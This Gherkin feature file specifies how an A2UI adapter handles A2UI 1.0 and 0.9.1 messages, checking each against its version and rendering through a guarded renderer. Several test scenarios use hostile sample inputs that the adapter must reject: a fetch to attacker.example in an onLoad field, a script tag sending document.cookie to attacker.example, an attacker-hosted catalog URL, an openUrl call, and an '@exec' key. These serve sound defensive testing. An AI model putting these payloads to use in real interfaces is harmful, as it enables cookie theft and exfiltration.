Feature: A2UI 1.0 alongside 0.9.1 in the A2UI adapter
  @kimen/adapter-a2ui accepts A2UI 1.0 messages next to the 0.9.1 ones it
  already speaks. Each message is handled by the version it declares, checked
  against that version's own shapes, and a surface never mixes versions. Both
  versions translate into the same neutral catalog and reach the screen only
  through the guarded renderer.

  Rule: Each message is handled by the A2UI version it declares

    # S1
    Scenario: A 1.0 surface created in a single message renders as catalog components
      Given an agent speaking A2UI "1.0"
      When the agent creates a surface carrying an order summary card with a "Confirm order" button
      Then the guarded renderer renders the surface
      And every rendered element is a catalog component

    # S2
    Scenario: A 0.9.1 agent gets the same catalog surface as a 1.0 agent
      Given an order summary surface already rendered from A2UI "1.0" messages
      When an agent speaking A2UI "v0.9.1" sends the same order summary in 0.9.1 messages
      Then the 0.9.1 surface renders the same catalog components as the 1.0 surface

    # S3
    Scenario: A message tagged with an unsupported version is rejected
      Given an adapter supporting the A2UI versions "1.0", "v0.9.1" and "v0.9"
      When an agent sends a message tagged "v1.0"
      Then the adapter rejects the message naming the supported versions
      And nothing from the rejected message renders

    # S4
    Scenario: A 1.0 envelope outside the 1.0 shapes is rejected before anything renders
      Given an agent speaking A2UI "1.0"
      When the agent sends a surface creation carrying the undeclared field "onLoad" with value "fetch('https://attacker.example/')"
      Then the whole message is rejected naming the field "onLoad"
      And no surface is created

  Rule: A surface never mixes A2UI versions

    # S5
    Scenario: A 0.9.1 message carrying a 1.0 binding key is rejected
      Given a surface created with A2UI "v0.9.1"
      When the agent sends a 0.9.1 text bound with the 1.0 key "@path" to "/user/firstName"
      Then the message is rejected as malformed for A2UI 0.9.1
      And the surface keeps its previous content

    # S6
    Scenario: A 1.0 component carrying a bare 0.9.1 envelope key is rejected
      Given a surface created with A2UI "1.0"
      When the agent sends a 1.0 text field carrying the bare 0.9.1 key "checks"
      Then the message is rejected naming the unknown property "checks"
      And the surface keeps its previous content

    # S7
    Scenario: A surface accepts only the version that created it
      Given a surface "checkout" created with A2UI "1.0"
      When the agent sends a "v0.9.1" component update for "checkout"
      Then the message is rejected naming the surface version "1.0"
      And the surface keeps its previous content

    # S8
    Scenario: Each version accepts only its own basic catalog
      Given an agent speaking A2UI "1.0"
      When the agent creates a surface on the catalog "https://a2ui.org/specification/v0_9/catalogs/basic/catalog.json"
      Then the adapter rejects the surface naming the 1.0 basic catalog it supports

  Rule: A2UI 1.0 features translate into the neutral catalog

    # S9
    Scenario: Setting a 1.0 data-model path to null removes its value
      Given a 1.0 surface whose text is bound to "/user/firstName" holding "Ada"
      When the agent sets "/user/firstName" to null
      Then the text shows the empty state

    # S10
    Scenario: A declared 1.0 action returns as a 1.0 event carrying its user message
      Given a 1.0 surface whose "Confirm order" button declares the action "confirm-order" with the user message "Order confirmed"
      When the user activates the button
      Then the agent receives an A2UI "1.0" action event naming "confirm-order"
      And the event carries the user message "Order confirmed"

    # S11
    Scenario: The template index function numbers the items of a list
      Given a 1.0 list template over "/items" whose label is the item index with offset 1
      When the data model holds the items "Apple", "Banana" and "Cherry"
      Then the list renders the labels "1", "2" and "3" in that order

    # S12
    Scenario: Plain objects in a 1.0 action context travel as literal data
      Given a 1.0 surface whose data model holds "ada@example.com" at "/user/email"
      And a button whose action context holds an object with "path" "/user/email" and "@@type" "note"
      When the user activates the button
      Then the event context carries "path" "/user/email" and "@type" "note" unchanged
      And the event context does not carry "ada@example.com"

    # S13
    Scenario: A 1.0 text field placeholder reaches the catalog input
      Given an agent speaking A2UI "1.0"
      When the agent sends a text field labeled "Email" with the placeholder "ada@example.com"
      Then a catalog text input labeled "Email" shows the placeholder "ada@example.com"

    # S14
    Scenario: An unmapped 1.0 component type renders its declared fallback
      Given the 1.0 compatibility matrix declares no catalog mapping for "Video"
      When the agent sends a 1.0 video with a poster
      Then the declared fallback renders in its place and the gap is reported to the agent
      And the rest of the surface renders normally

    # S15
    Scenario: A value needing an unevaluated function degrades without calling the agent
      Given a 1.0 text whose value calls the basic catalog function "formatDate"
      When the agent sends that component
      Then the declared fallback renders in its place and the gap is reported naming "formatDate"
      And no function call is sent to the agent

  Rule: The compatibility matrix declares coverage per version

    # S16
    Scenario: The matrix binds each version to its exact specification and coverage
      Given the published adapter package
      When the compatibility matrix is consulted
      Then each supported A2UI version names its exact upstream commit, envelope versions and basic catalog
      And each version's component types name their catalog counterpart or their declared fallback

    # S17
    Scenario: The adapter advertises A2UI 1.0 as its preferred version
      Given the published adapter package
      When a host reads the renderer capabilities the adapter declares
      Then A2UI "1.0" comes first with the 1.0 basic catalog
      And "v0.9" follows with the 0.9.1 basic catalog

  Rule: The guardrail holds for A2UI 1.0

    # S18
    Scenario: A 1.0 message using a forbidden type is rejected
      Given the 1.0 compatibility matrix declares the type "html" forbidden for security
      When the agent sends a 1.0 component of type "html" whose content is "<script>fetch('https://attacker.example/'+document.cookie)</script>"
      Then the whole message is rejected naming the forbidden type "html"
      And nothing from the rejected message renders

    # S19
    Scenario: A 1.0 component naming a catalog other than the basic catalog is rejected
      Given a 1.0 surface on the 1.0 basic catalog
      When the agent sends a component whose catalog override names "https://attacker.example/catalog.json"
      Then the whole message is rejected naming the unsupported catalog
      And nothing from the rejected message renders

    # S20
    Scenario: A 1.0 action outside the declared set never dispatches
      Given a 1.0 surface whose declared action set contains only "confirm-order"
      When the agent sends an update binding a button to the action "export-account-data"
      Then the binding is rejected naming the undeclared action
      And activating that button dispatches no event

    # S21
    Scenario: An agent request to run a renderer function is refused
      Given a 1.0 surface "checkout"
      When the agent asks the renderer to run "openUrl" with the URL "https://attacker.example/"
      Then the agent receives a function response with the error code "INVALID_FUNCTION_CALL"
      And no navigation or request leaves the page

    # S22
    Scenario: An unknown reserved key in a 1.0 value is rejected
      Given a 1.0 surface "checkout"
      When the agent sends a button whose action context carries the unknown reserved key "@exec"
      Then the whole message is rejected naming the reserved key "@exec"
      And nothing from the rejected message renders

    # S23
    Scenario: A rejected 1.0 message is reported to the agent in the 1.0 shape
      Given a 1.0 surface "s"
      When the agent sends a card carrying the undeclared property "style"
      Then the agent receives an A2UI "1.0" validation error naming the surface and the offending property

  Rule: What the person enters is written back to the data model

    # S24
    Scenario Outline: A typed value reaches the agent with the next action
      Given an A2UI "<version>" surface whose text field is bound to "/booking/email" and whose "Book" button sends "/booking/email" in its context
      And the person typed "ana@example.com" into the text field
      When the person activates "Book"
      Then the agent receives the action "book" with "ana@example.com" in its context

      Examples:
        | version |
        | 1.0     |
        | v0.9.1  |

    # S25
    Scenario Outline: A choice the person makes is written to its bound path
      Given a 1.0 surface whose <control> is bound to "<path>" holding <before>
      And the person changed the <control> to <after>
      When the person activates a button that sends "<path>" in its context
      Then the agent receives <after> for "<path>"

      Examples:
        | control              | path              | before | after  |
        | checkbox             | /prefs/newsletter | false  | true   |
        | single-choice picker | /order/size       | ["m"]  | ["l"]  |
        | slider               | /order/quantity   | 1      | 3      |

    # S26
    Scenario: The data model sent with an action carries what the person entered
      Given a 1.0 surface created with sendDataModel whose text field is bound to "/booking/email"
      And the person typed "ana@example.com" into the text field
      When the person activates "Book"
      Then the data model attached to the action holds "ana@example.com" at "/booking/email"

    # S27
    Scenario: Writing back keeps the person's place in the surface
      Given a 1.0 surface with a name field bound to "/booking/name" and an email field bound to "/booking/email"
      And the person typed "Ana" into the name field
      When the person moves to the email field
      Then the email field has focus
      And the name field still shows "Ana"

    # S28
    Scenario: A field with a literal value writes nothing to the data model
      Given a 1.0 surface created with sendDataModel whose text field holds the literal value "draft"
      And the person typed "final" into the text field
      When the person activates "Save"
      Then the data model attached to the action is the one the agent last set
